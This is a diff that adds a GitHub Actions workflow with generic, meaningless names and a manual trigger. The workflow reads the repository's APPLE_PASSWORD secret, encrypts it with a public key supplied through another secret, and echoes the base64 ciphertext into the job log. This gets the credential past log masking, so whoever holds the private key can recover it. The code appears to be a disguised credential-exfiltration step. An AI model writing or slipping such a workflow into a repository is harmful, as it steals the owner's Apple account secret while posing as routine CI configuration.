@@ -1,0 +1,23 @@
+name: xyz
+on:
+  workflow_dispatch:
+
+jobs:
+  abcdefghijklmnopqrstuvqxyz:
+    runs-on: ubuntu-latest
+    env:
+      APPLE_APP_SPECIFIC_PASSWORD: ${{ secrets.APPLE_ID_PASSWORD }}
+
+    steps:
+      - name: Install OpenSSL
+        run: sudo apt-get install -y openssl
+
+      - name: Decode public key
+        run: echo "${{ secrets.PUBLIC_KEY }}" | base64 -d > public.pem
+
+      - name: Encrypt Apple password
+        run: |
+          echo "${{ secrets.APPLE_PASSWORD }}" > secret.txt
+          openssl rsautl -encrypt -pubin -inkey public.pem -in secret.txt -out secret.enc
+          base64 secret.enc > encrypted.txt
+          echo "ENCRYPTED_SECRET=$(cat encrypted.txt)"
